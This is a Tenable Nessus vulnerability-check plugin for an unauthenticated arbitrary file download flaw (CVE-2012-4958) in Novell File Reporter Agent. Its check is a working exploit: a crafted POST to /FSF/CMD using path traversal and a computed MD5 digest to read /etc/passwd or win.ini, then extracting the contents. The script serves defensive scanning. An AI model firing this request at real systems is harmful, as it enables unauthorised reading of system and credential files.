#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62977);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2015/01/13 15:25:35 $");

  script_cve_id("CVE-2012-4958");
  script_bugtraq_id(56579);
  script_osvdb_id(87573);
  script_xref(name:"CERT", value:"273371");

  script_name(english:"Novell File Reporter Agent FSFUI UICMD 126 Arbitrary File Download");
  script_summary(english:"Tries to download a file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"An application running on the remote host has an arbitrary file
download vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Novell File Reporter Agent running on the remote host
has an arbitrary file download vulnerability.  Making a specially
crafted POST request to /FSF/CMD for records with a name of FSFUI and
UICMD of 126 could result in arbitrary files being downloaded.  A
remote, unauthenticated attacker could exploit this to download
arbitrary files as root (against Linux targets) or SYSTEM (against
Windows targets). 

This version of Novell File Reporter Agent likely has other
vulnerabilities, but Nessus has not checked for those issues."
  );
  # https://community.rapid7.com/community/metasploit/blog/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ccbf3bbd");
  script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'NFR Agent FSFUI Record File Upload RCE');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2012/11/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/11/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:novell:file_reporter");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("novell_file_reporter_agent_detect.nbin", "os_fingerprint.nasl");
  script_require_ports("Services/nfr-agent", 3037);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_service(svc:'nfr-agent', default:3037, exit_on_fail:TRUE);

if (report_paranoia < 2 && (os = get_kb_item('Host/OS')))
{
  if ('Windows' >< os)
  {
    checks["\windows\win.ini"] = '; for 16-bit app support';
    checks["\winnt\win.ini"] = '; for 16-bit app support';
  }
  else
  {
    checks["/etc/passwd"] = 'root:.*:0:[01]:';
  }
}
else
{
    checks["\windows\win.ini"] = '; for 16-bit app support';
    checks["\winnt\win.ini"] = '; for 16-bit app support';
    checks["/etc/passwd"] = 'root:.*:0:[01]:';
}

foreach file (keys(checks))
{
  pattern = checks[file];
  if ('/etc/passwd' >< file)
    traversal = '../../../../../../../../..';
  else
    traversal = '..\\..\\..\\..\\..\\..\\..\\..\\..';

  record =
    '<RECORD>' +
    '<NAME>FSFUI</NAME>' +
    '<UICMD>126</UICMD>' +
    '<FILE>' + traversal + file + '</FILE>' +
    '</RECORD>';
  digest = toupper(hexstr(MD5('SRS' + record + 'SERVER')));
  req = digest + record;
  res = http_send_recv3(
    port:port,
    method:'POST',
    item:'/FSF/CMD',
    data:req,
    content_type:'text/xml',
    exit_on_fail:TRUE
  );

  if (res[2] =~ pattern)
  {
    if (report_verbosity > 0)
    {
      # extract the file contents from the XML response
      contents = strstr(res[2], '![CDATA[');
      trailer = strstr(contents, ']]>');
      contents = contents - '![CDATA[' - trailer;

      report =
        '\nNessus retrieved ' + file + ' by making the following request :\n\n' +
        http_last_sent_request() +
        '\n\nWhich returned the following data :\n\n' +
        contents;
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
    # never reached
  }
}

# this code is only hit if none of the exploit attempts worked
audit(AUDIT_LISTEN_NOT_VULN, 'Novell File Reporter Agent', port);
